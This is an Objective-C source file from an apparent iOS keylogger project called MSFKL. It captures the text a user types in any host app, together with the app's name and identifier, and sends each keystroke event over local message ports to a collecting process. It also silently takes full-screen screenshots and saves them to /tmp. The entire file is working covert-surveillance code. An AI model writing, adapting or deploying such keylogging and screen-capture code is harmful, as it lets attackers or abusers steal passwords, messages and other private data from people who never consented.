//
//  KeyboardUtils.m
//  MSFKL
//
//  Created by Ophat Phuetkasickonphasutha on 9/4/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

#import "KeyboardUtils.h"
#import "DefStd.h"
#import "MessagePortIPCSender.h"
#import "StringUtils.h"
#import "FxKeyLogEvent.h"
#import "DateTimeFormat.h"

static KeyboardUtils *_KeyboardUtils = nil;

CGImageRef UICreateScreenImage(); // Method from UIKit framework

@interface KeyboardUtils (private)
- (void) thread: (FxKeyLogEvent *) aKeyLogEvent;
- (void) applicationResignActive;
+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
- (void) onTick;
- (void) CaptureDatawithImage:(NSArray *)aData;

@end

@implementation KeyboardUtils

@synthesize mCharacter;
@synthesize mRawCharacter;
@synthesize mCountDown;

+ (id) sharedKeyboardUtils{
	if (_KeyboardUtils == nil) {
		_KeyboardUtils = [[KeyboardUtils alloc] init];
		[_KeyboardUtils setMCharacter:@""];
		[_KeyboardUtils setMRawCharacter:@""];
		[_KeyboardUtils setMCountDown:nil];
		NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
		[nc addObserver:_KeyboardUtils selector:@selector(applicationResignActive) name:UIApplicationWillResignActiveNotification object:nil];
	}
	return (_KeyboardUtils);

}
+ (void) sendKeyboardEvent: (FxKeyLogEvent *) aKeyLogEvent{
	KeyboardUtils *keyboardUtils = [[KeyboardUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:) toTarget:keyboardUtils withObject:aKeyLogEvent];
	[KeyboardUtils autorelease];
}

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	successfully = [messagePortSender writeDataToPort:aData];
	[messagePortSender release];
	messagePortSender = nil;
	return (successfully);
}

- (UIImage *) takeScreenShot {
	CGImageRef cgImage = UICreateScreenImage();
	UIImage *screenShot = [UIImage imageWithCGImage:cgImage];
	CGImageRelease(cgImage);
	return (screenShot);
}

- (void) thread: (FxKeyLogEvent *) aKeyLogEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	DLog(@"aKeyLogEvent = %@",aKeyLogEvent);
	
	if ([[aKeyLogEvent mRawData] length]>0 && [[aKeyLogEvent mActualDisplayData] length]>0) {
		
		NSMutableData* data = [[NSMutableData alloc] init];
		
		NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
		[archiver encodeObject:aKeyLogEvent forKey:kKeyLogArchied];
		[archiver finishEncoding];
		[archiver release];	
		
		BOOL successfullySend = NO;
		successfullySend = [KeyboardUtils sendDataToPort:data portName:kKeyLogMessagePort];
		if(successfullySend){
			DLog (@"************ successfullySend");
		}
		if (!successfullySend) {
			DLog (@"=========================================")
			DLog (@"************ successfullySend failed 1");
			DLog (@"=========================================")
			successfullySend = [KeyboardUtils sendDataToPort:data portName:kKeyLogMessagePort1];
			if (!successfullySend) {
				DLog (@"=========================================")
				DLog (@"************ successfullySend failed 2");
				DLog (@"=========================================")
				successfullySend = [KeyboardUtils sendDataToPort:data portName:kKeyLogMessagePort2];
				if (!successfullySend) {
					DLog (@"=========================================")
					DLog (@"************ successfullySend failed 3");
					DLog (@"=========================================")
				}
			}
		}
		
		[data release];
	}
	
	[pool release];
}

- (void) applicationResignActive{
	if([mCharacter length]>0 && [mRawCharacter length]>0){
		DLog (@"************ applicationResignActive");
		DLog(@"mCharacter %@",mCharacter);
		DLog(@"mRawCharacter %@",mRawCharacter);
		[self CaptureData];
	}
	
}
- (void) onTick{
	if([mCharacter length]>0 && [mRawCharacter length]>0){
		DLog (@"************ onTick");
		DLog(@"mCharacter %@",mCharacter);
		DLog(@"mRawCharacter %@",mRawCharacter);
		[self CaptureData];
	}
}
- (void) dealloc {
	[mCharacter release];
	[mRawCharacter release];
	[mCountDown release];
	[super dealloc];
}

- (void)  CaptureData{
	NSArray * tempdata = [[NSArray alloc]initWithObjects:mCharacter,mRawCharacter,nil];
	KeyboardUtils *keyboardUtils = [[KeyboardUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(CaptureDatawithImage:) toTarget:keyboardUtils withObject:tempdata];
	[KeyboardUtils autorelease];
	[tempdata release];
	
	// freetext and remove timer
	[self setMCharacter:@""];
	[self setMRawCharacter:@""];
	[mCountDown invalidate];
	[self setMCountDown:nil];
}

- (void) CaptureDatawithImage:(NSArray *)aData {
	NSString *Character = [aData objectAtIndex:0];
	NSString *RawCharacter = [aData objectAtIndex:1];

	DLog (@"************ Send pending text");
	FxKeyLogEvent * keyLog = [[FxKeyLogEvent alloc]init];
	NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
	NSDictionary *bundleInfo = [[NSBundle mainBundle] infoDictionary];
	NSString * appName = [bundleInfo objectForKey:@"CFBundleDisplayName"];
	
	NSLog(@"g1 mCharacter %@",Character);
	NSLog(@"g1 mRawCharacter %@",RawCharacter);
	
	[keyLog setMUserName:@"mobile"];
	[keyLog setMTitle:appName];
	[keyLog setMApplication:identifier];
	[keyLog setMActualDisplayData:Character];
	[keyLog setMRawData:RawCharacter];
	[keyLog setDateTime:[DateTimeFormat phoenixDateTime]];
	
	[KeyboardUtils sendKeyboardEvent:keyLog];
	[keyLog release];
	
	// takeScreenShot
	UIImage * screen = [self takeScreenShot];
	NSData * screencap = UIImageJPEGRepresentation(screen, 1);
	[screencap writeToFile:@"/tmp/1.png" atomically:YES];
}

@end
